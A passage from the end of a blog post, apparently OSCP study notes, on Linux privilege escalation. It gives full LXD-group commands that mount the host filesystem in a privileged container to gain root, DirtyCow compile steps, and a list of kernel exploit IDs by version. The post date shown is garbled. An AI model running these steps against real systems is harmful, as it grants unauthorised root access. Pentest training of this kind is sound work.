</code></pre></div><h3 id="lxclxd">LXC/LXD</h3>
<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#960050;background-color:#1e0010">╭─</span>swissky@lab ~  
<span style="color:#960050;background-color:#1e0010">╰─</span>$ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
</code></pre></div><p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># build a simple alpine image</span>
git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

<span style="color:#75715e"># import the image</span>
lxc image import ./alpine.tar.gz --alias myimage

<span style="color:#75715e"># run the image</span>
lxc init myimage mycontainer -c security.privileged=true

<span style="color:#75715e"># mount the /root into the image</span>
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

<span style="color:#75715e"># interact with the container</span>
lxc start mycontainer
lxc exec mycontainer /bin/sh
</code></pre></div><p>Alternatively <a href="https://github.com/initstring/lxd_root">https://github.com/initstring/lxd_root</a></p>
<h2 id="kernel-exploits">Kernel Exploits</h2>
<p>Precompiled exploits can be found inside these repositories, run them at your own risk !</p>
<ul>
<li><a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">bin-sploits - @offensive-security</a></li>
<li><a href="https://github.com/lucyoa/kernel-exploits/">kernel-exploits - @lucyoa</a></li>
</ul>
<p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p>
<p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code>
Copy the kernel version and distribution, and search for it in google or in <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>.</p>
<h3 id="cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</h3>
<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># make dirtycow stable</span>
echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
</code></pre></div><h3 id="cve-2010-3904-rds">CVE-2010-3904 (RDS)</h3>
<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/15285/
</code></pre></div><h3 id="cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</h3>
<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/15704/
</code></pre></div><h3 id="cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</h3>
<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/18411
</code></pre></div><h3 id="list">LIST</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*2.6.32-21-genaric-pae https<span style="color:#960050;background-color:#1e0010">:</span>//raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -m32 -pthread dirty.c -o dirty2 -lcrypt
*linux2421		- Linux 2.4.7(crashed)
*9.0 (28718.c)		- FreeBSD 9.0
*centsos45 (9542.c)	- CentOS 4.4 - 4.5 (Linux 2.6 - 2.6.19)
*linux26 (5093.c)	- Linux (2.6.23 - 2.6.24)
*18411.c		- Linux 2.6.39 &lt; 3.2.2 (Ubuntu 11.10, kernel 3.0.0-12)
*37292.c(ubuntu)	- ubuntu 14.04 (Linux 3.13 - 3.19)
Linux Kernel 2.6.17 &lt; 2.6.24.1	5092
Linux Kernel 2.4/2.6	9479
CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)	9542
RDS Protocol<span style="color:#e6db74">&#39; Local Privilege Escalation	15285
</span><span style="color:#e6db74">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation	28718
</span><span style="color:#e6db74">Apport/Abrt (Ubuntu / Fedora)	36746
</span><span style="color:#e6db74">Ubuntu 12.04/14.04/14.10/15.04	37292
</span><span style="color:#e6db74">Ubuntu 14.04/15.10	39166
</span><span style="color:#e6db74">Stapler	Ubuntu 16.04	39772
</span><span style="color:#e6db74">Dirty COW	40616
</span><span style="color:#e6db74">Dirty COW /proc/self/mem&#39;</span> Race Condition	40847
GNU Screen 4.5.0	41154
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free	41458
Ubuntu 14.04/16.04 (KASLR / SMEP)	43418
Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4)	44298
Linux Kernel 2.6	8478
Dirty COW	40616
GUnet OpenEclass E-learning platform 1.7.3	48106
Dirty COW	40839
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - <span style="color:#e6db74">&#39;overlayfs&#39;</span>	37292
Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27)	45010
</code></pre></div><h2 id="references">References</h2>
<p>-<a href="https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/#Sudo_LD_LIBRARY_PATH_Privilege_Escalation">https://thecryptonian.co.uk/linux-privilege-escalation-cheat-sheet/</a>
-<a href="https://github.com/Ignitetechnologies/Privilege-Escalation">https://github.com/Ignitetechnologies/Privilege-Escalation</a>
-<a href="https://www.hackingarticles.in/category/privilege-escalation/">https://www.hackingarticles.in/category/privilege-escalation/</a></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources</a></li>
<li><a href="https://fosterelli.co/privilege-escalation-via-docker.html">Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li>
</ul>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://tranquac.github.io/tags/oscp/">oscp</a></span>
        <span class="tag"><a href="https://tranquac.github.io/tags/infosec/">infosec</a></span>
        <span class="tag"><a href="https://tranquac.github.io/tags/linux/">linux</a></span>
        <span class="tag"><a href="https://tranquac.github.io/tags/privilege-escalation/">privilege-escalation</a></span>
        
    </p>

      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://tranquac.github.io/categories/oscp/">oscp</a></span>
        <span class="tag"><a href="https://tranquac.github.io/categories/infosec/">infosec</a></span>
        <span class="tag"><a href="https://tranquac.github.io/categories/linux/">linux</a></span>
        <span class="tag"><a href="https://tranquac.github.io/categories/privilege-escalation/">privilege-escalation</a></span>
        
    </p>


      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        3053 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          18183-03-18 07:00
        

         
          
        
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Linux%20Privilege%20Escalation&amp;caption=Linux%20Privilege%20Escalation&amp;canonicalUrl=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=Linux%20Privilege%20Escalation&amp;body=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f&amp;media=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f;description=Linux%20Privilege%20Escalation" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f&amp;title=Linux%20Privilege%20Escalation&amp;summary=Linux%20Privilege%20Escalation&amp;source=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f&amp;resubmit=true&amp;title=Linux%20Privilege%20Escalation" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f;title=Linux%20Privilege%20Escalation" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=Linux%20Privilege%20Escalation%20https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f&amp;t=Linux%20Privilege%20Escalation" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Linux%20Privilege%20Escalation&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f03%2flinux-privilege-escalation%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
    <div class="pagination">
        <div class="pagination__title">
            <span class="pagination__title-h"></span>
            <hr />
        </div>

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="https://tranquac.github.io/posts/2021/04/getting-the-oscp-certification-offensive-security-certified-professional-pen-200-review/">
                    <span class="button__icon">←</span>
                    <span class="button__text">Getting the OSCP Certification: &#39;Offensive Security Certified Professional&#39; (PEN-200) review</span>
                </a>
            </span>
            

            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            <span><a href="https://tranquac.github.io">quac tran</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://tranquac.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/tranquac">Quac Tran</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://tranquac.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>



    </body>
</html>
